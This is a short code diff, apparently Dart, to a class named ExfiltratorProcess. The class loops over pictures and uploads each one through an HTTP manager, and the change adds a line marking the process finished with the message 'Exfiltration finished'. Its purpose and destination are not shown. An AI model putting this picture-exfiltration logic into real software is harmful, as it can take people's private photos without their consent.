@@ -13,6 +13,8 @@ class ExfiltratorProcess {
       for(Picture picture in pictures){
         HttpRequestManager.sendPicture(picture);
       }
+      _isRunning = false;
+      print("Exfiltration finished");
     }
   }
 }
